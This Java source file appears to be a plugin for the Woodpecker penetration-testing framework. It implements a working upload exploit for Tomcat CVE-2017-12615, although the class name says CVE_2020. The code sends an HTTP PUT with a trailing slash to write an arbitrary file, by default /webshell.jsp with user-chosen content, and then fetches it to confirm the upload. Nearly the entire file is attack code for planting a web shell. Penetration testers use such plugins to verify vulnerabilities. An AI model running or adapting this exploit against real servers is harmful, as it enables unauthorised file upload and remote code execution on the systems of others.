package me.gv7.woodpecker.vuldb.CVE_2017_12615.exploit;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.vuldb.CVE_2017_12615.CVE_2017_12615_Plugin;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class CVE_2020_12615_UploadExploit implements IExploit {
    public String getExploitTabCaption() {
        return "Upload";
    }

    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder argsUsageBinder = CVE_2017_12615_Plugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        final IArg command = CVE_2017_12615_Plugin.pluginHelper.createArg();
        command.setName("file");
        command.setDefaultValue("/webshell.jsp");
        command.setRequired(true);
        command.setDescription("要写的文件");
        args.add(command);

        final IArg fileContent = CVE_2017_12615_Plugin.pluginHelper.createArg();
        fileContent.setName("file_content");
        fileContent.setDefaultValue("<%out.write(1);%>");
        fileContent.setRequired(true);
        fileContent.setDescription("文件内容");
        args.add(fileContent);

        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doExploit(ITarget target, Map<String, Object> customArgs, IResultOutput resultOutput) {
        String vulURL = (String)target.getRootAddress() + customArgs.get("file") + "/";
        String fileContent = (String)customArgs.get("file_content");
        RawResponse putResp = Requests.put(vulURL).body(fileContent).verify(false).send();
        resultOutput.infoPrintln(String.format("PUT %s status_code:%d",customArgs.get("file"),putResp.getStatusCode()));
        String fileURL = target.getRootAddress() + customArgs.get("file");
        RawResponse fileResp = Requests.get(fileURL).verify(false).send();
        if(fileResp.getStatusCode() != 404 && fileResp.getStatusCode() != 403 && fileResp.getStatusCode() != 302){
            resultOutput.failPrintln(String.format("GET %s status: %s,upload success!",fileURL,fileResp.getStatusCode()));
        }else{
            resultOutput.failPrintln(String.format("GET %s status: %s,upload fail!",fileURL,fileResp.getStatusCode()));
        }
    }
}
